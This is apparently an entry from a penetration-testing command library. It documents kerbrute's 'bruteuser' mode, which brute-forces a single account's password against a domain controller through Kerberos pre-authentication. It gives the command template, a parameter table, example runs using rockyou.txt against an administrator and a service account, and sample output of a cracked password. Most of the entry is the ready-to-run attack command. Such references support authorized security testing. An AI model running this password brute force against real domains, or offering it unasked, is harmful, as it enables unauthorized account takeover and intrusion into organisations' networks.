---
type: command
executor: bash
data: >-
  ./kerbrute_linux_amd64 bruteuser -d $_DOMAIN --dc $_DC_IP $_PASSWORD_FILE
  $_USERNAME
output: null
created_at: '2023-04-06T03:56:04.255388+00:00'
updated_at: '2023-04-10T20:36:09.930886+00:00'
platforms:
  - Linux
tags:
  - bruteforce
  - kerberos
verified: true
validated: true
---

# kerbrute-brute-user-password

## Command

```bash
./kerbrute_linux_amd64 bruteuser -d $_DOMAIN --dc $_DC_IP $_PASSWORD_FILE $_USERNAME
```

## Description

This command brute forces the password for a specific username using a password wordlist via Kerberos pre-auth requests. It attempts each password until a match or exhaustion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -d $_DOMAIN | Target domain name | Yes |
| --dc $_DC_IP | Domain controller IP | Yes |
| $_PASSWORD_FILE | Path to password wordlist | Yes |
| $_USERNAME | Specific username to target | Yes |

## Examples

### Basic Usage

```bash
./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt administrator
```

### Advanced Usage

```bash
./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 passwords.txt serviceaccount
```

## Expected Output

Progress shows attempts; success in green:

```
[*] Testing password 1/10000: password123
[+] SUCCESS: administrator@domain.local cracked with password123
```

## Related

- [[procedures/Kerberos-Pre-Auth-Bruteforcing]]
- [[tools/kerbrute]]
